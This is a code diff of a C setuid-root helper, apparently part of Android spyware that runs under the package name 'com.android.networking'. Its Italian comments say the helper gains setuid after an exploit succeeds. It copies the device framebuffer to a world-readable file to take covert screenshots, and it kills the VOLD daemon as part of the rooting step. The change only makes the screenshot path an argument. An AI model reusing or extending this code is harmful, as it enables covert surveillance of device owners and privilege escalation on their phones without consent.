@@ -39,7 +39,7 @@ void my_chown(const char *user, const char *group, const char *file);
 void my_chmod(const char *mode, const char *file); 
 static void copy_root(const char *mntpnt, const char *dst);
 static void delete_root(const char *mntpnt, const char *dst);
-static int get_framebuffer();
+static int get_framebuffer(char *filename);
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 // statuslog -c "/system/bin/cat /dev/graphics/fb0"
@@ -51,11 +51,11 @@ int main(int argc, char** argv) {
 		return 0;
 
 	// Cattura uno screenshot
-	if (strcmp(argv[1], "fb") == 0) {
-		char* filename = "/data/data/com.android.networking/files/frame";
+	if (strcmp(argv[1], "fb") == 0 && argc == 3) {
+		char* filename = argv[2];
 
 		copy("/dev/graphics/fb0", filename);
-		chmod("/data/data/com.android.networking/files/frame", 0666);
+		chmod(filename, 0666);
 	} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
 		unsigned int pid;
 		
@@ -119,7 +119,7 @@ int main(int argc, char** argv) {
 
 // Allo stato attuale, la copy funziona meglio...
 // Come referenza futura: http://www.pocketmagic.net/?p=1473
-static int get_framebuffer() {
+static int get_framebuffer(char *filename) {
 	int fd, fd_out;
 	void *bits;
 	struct fb_var_screeninfo vi;
@@ -152,7 +152,7 @@ static int get_framebuffer() {
 	}
 
 
-	fd_out = open("/data/data/com.android.networking/files/frame", O_CREAT | O_RDWR);
+	fd_out = open(filename, O_CREAT | O_RDWR);
 
 	if (fd_out < 0) {
 		perror("failed to create frame file");
